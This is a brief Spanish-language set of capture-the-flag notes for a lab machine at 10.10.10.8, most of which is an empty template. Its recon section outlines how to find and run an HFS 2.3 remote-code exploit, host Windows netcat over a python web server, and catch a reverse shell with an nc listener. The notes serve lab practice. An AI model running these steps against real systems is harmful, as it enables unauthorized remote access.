## Summary

Tags: 
N
- IP -> 10.10.10.8
- Ports -> TCP (), UDP (idk)
- OS ->  
- Services & Applications
    -  -> 
    -  -> 


## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon
- Comando -> **whatweb http://< URL>**  Nos dara una breve descripcion del gestor de contenidos del puerto 80
- Comando -> **searchsploit HFS 2.3** Buscamos vulnerabilidades, si encontramos con .py mucho mejor
Al exploit (2) en python lo modificamos, colocandoles nuestra IP
- **python2 hfs_exploit.py 10.10.10.8 80** Lo ejecutamos, en donde la especificamos la IP victima y su puerto 

Nos descargamos el netcat ya que debemos de ejecutar el comando anterior minimo 2 veces en donde buscara el netcat con un recurso compartido (El netcat debe ser para Windows) por lo que nos lo descargamos 
- **python3 -m http.server 80** Montamos el recurso compartido 
- **rlwrap nc -nlvp 443** Nos ponemos en escucha para recibir la revershell

## User


## Root